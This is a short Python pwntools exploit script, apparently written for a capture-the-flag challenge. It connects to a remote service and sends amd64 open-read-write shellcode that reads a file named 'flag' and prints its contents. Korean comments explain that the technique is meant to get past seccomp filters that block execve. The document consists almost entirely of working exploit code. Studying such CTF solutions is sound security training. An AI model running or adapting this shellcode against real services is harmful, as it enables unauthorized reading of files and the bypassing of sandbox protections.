from pwn import *

context.os = 'linux'
context.arch = 'amd64'

#r = process('./run_your_shellcode')
r = remote('34.64.219.95', 19505)

flag = b''

'''
1. seccomp가 걸린 문제 : execve 명령어 차단하는 경우가 존재
2. sh 같은 문자열을 임의의 문자열로 변경하는 경우
  -> orw 쉘코드 사용해야함
'''
# 2-1. orw shellcode
CODE = shellcraft.open('flag')
CODE += shellcraft.read('rax', 'rsp', 0x100)
CODE += shellcraft.write(1, 'rsp', 0x100)

CODE = asm(CODE)

r.sendline(CODE)

print(r.recvuntil(b'}'))